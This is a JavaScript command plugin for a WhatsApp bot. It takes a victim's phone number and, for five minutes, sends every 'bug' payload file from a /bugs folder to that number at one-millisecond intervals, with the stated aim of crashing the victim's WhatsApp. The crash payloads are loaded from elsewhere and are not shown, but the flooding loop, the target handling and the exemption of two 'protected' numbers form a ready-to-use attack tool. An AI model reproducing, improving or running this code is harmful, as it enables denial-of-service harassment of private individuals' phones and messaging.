const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'k1ng-crash',
  desc: 'Crash target using all bug payloads + 1.png preview (5min)',
  category: 'k1ng',
  react: '💣',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    if (cmdName !== 'k1ng-crash') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}k1ng-crash <number>`
      }, { quoted: mek });
    }

    const protectedNumbers = ['13058962443', '50942241547'];
    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Operation cancelled.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 No payloads found in /bugs folder.'
      }, { quoted: mek });
    }

    // ✅ Voye imaj 1.png anvan atak
    const imagePath = path.join(__dirname, '../media/1.png');
    if (fs.existsSync(imagePath)) {
      const imageBuffer = fs.readFileSync(imagePath);
      await bot.sendMessage(from, {
        image: imageBuffer,
        caption: `🔥 k1ng-crash launched on wa.me/${targetNumber}\n🕒 Duration: 5min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`
      }, { quoted: mek });
    }

    const endTime = Date.now() + (5 * 60 * 1000); // 5 minit

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetNumber);
          }
        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 1)); // 0.001s delay
      }
    }

    await bot.sendMessage(from, {
      text: `✅ k1ng-crash attack ended for +${targetNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
